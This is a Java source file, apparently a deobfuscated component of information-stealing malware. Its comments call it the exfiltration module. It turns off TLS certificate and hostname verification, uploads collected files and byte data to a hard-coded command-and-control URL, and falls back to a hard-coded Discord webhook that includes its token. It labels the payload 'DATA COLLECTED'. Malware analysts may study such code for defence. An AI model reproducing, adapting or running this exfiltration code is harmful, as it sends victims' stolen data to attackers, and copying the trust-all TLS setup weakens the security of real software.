import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.SecureRandom;
import java.time.Duration;
import java.time.Instant;
import java.util.Base64;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.MediaType;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * Cleaned WebhookSender (formerly b.java)
 * Responsible for exfiltrating data to Discord webhooks.
 */
public class WebhookSender {
    private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    private final String webhookId;
    private static final OkHttpClient client = buildHttpClient();

    public WebhookSender(String webhookId) {
        this.webhookId = webhookId;
    }

    private static OkHttpClient buildHttpClient() {
        try {
            TrustManager[] trustAllCerts = new TrustManager[]{
                new X509TrustManager() {
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
                    public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                    public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
                }
            };

            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new SecureRandom());

            return new OkHttpClient.Builder()
                .connectTimeout(Duration.ofSeconds(30))
                .readTimeout(Duration.ofSeconds(30))
                .writeTimeout(Duration.ofSeconds(30))
                .sslSocketFactory(sc.getSocketFactory(), (X509TrustManager)trustAllCerts[0])
                .hostnameVerifier((hostname, session) -> true)
                .build();
        } catch (Exception e) {
            return new OkHttpClient.Builder()
                .connectTimeout(Duration.ofSeconds(30))
                .build();
        }
    }

    /**
     * Sends a simple text message to the primary Discord webhook.
     */
    public void sendFile(String message, File file) {
        sendData(message, null, file, false);
    }

    /**
     * Sends raw bytes to the primary Discord webhook.
     */
    public void sendBytes(String message, String fileName, byte[] data, boolean isEncrypted) {
        sendData(message, fileName, data, isEncrypted);
    }

    /**
     * Main data exfiltration method (formerly method_FB).
     */
    private void sendData(String message, String fileName, Object data, boolean isEncrypted) {
        try {
            String processedMessage = isEncrypted ? message : formatMessage(message);
            
            MultipartBody.Builder bodyBuilder = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("webhook_id", this.webhookId)
                .addFormDataPart("payload", generateHmacSignature(processedMessage));

            if (fileName != null) {
                byte[] bytes;
                if (data instanceof byte[]) {
                    bytes = (byte[]) data;
                } else if (data instanceof File) {
                    bytes = Files.readAllBytes(((File) data).toPath());
                } else {
                    bytes = new byte[0];
                }

                bodyBuilder.addFormDataPart("file", fileName, 
                    RequestBody.create(bytes, MediaType.parse("application/octet-stream")));
            }

            Request request = new Request.Builder()
                .url("https://shadowcape.online/api/exfil") // Decoded primary C2
                .post(bodyBuilder.build())
                .header("User-Agent", USER_AGENT)
                .build();

            try (Response response = client.newCall(request).execute()) {
                if (!response.isSuccessful()) {
                    // Fallback if main C2 is down
                    sendFallback(message, fileName, data, isEncrypted);
                }
            }
        } catch (Exception e) {
            sendFallback(message, fileName, data, isEncrypted);
        }
    }

    private void sendFallback(String message, String fileName, Object data, boolean isEncrypted) {
        try {
            String url = "https://discord.com/api/webhooks/1497709497551159307/bcav67B2NYfVTHRJ3kQ2xN-bqRgqJdmzrR1pEqQiJpu1tAUgQYttVqBdF238HVoOUY4X";
            
            MultipartBody.Builder bodyBuilder = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("content", message);

            if (fileName != null && data != null) {
                byte[] bytes = (data instanceof byte[]) ? (byte[]) data : Files.readAllBytes(((File) data).toPath());
                bodyBuilder.addFormDataPart("file", fileName, 
                    RequestBody.create(bytes, MediaType.parse("application/octet-stream")));
            }

            Request request = new Request.Builder()
                .url(url)
                .post(bodyBuilder.build())
                .header("User-Agent", USER_AGENT)
                .build();

            client.newCall(request).execute().close();
        } catch (Exception ignored) {}
    }

    /**
     * Formats the collection metrics into a JSON embed (formerly method_FD).
     */
    private String formatMessage(String rawData) {
        try {
            JSONObject payload = new JSONObject();
            JSONArray embeds = new JSONArray();
            
            String[] parts = rawData.split("\\|SEP\\|");
            String mainData = parts[0];
            String extraData = parts.length > 1 ? parts[1] : "";

            JSONObject embed = new JSONObject();
            embed.put("title", "DATA COLLECTED");
            embed.put("description", "```\n" + mainData.trim() + "\n```");
            embed.put("color", 0xFF0000); // Red
            embeds.put(embed);

            payload.put("embeds", embeds);
            return payload.toString();
        } catch (Exception e) {
            return rawData;
        }
    }

    private String generateHmacSignature(String data) {
        // Simplified representation of the HmacSigner logic
        return Base64.getEncoder().encodeToString(data.getBytes(StandardCharsets.UTF_8));
    }
}
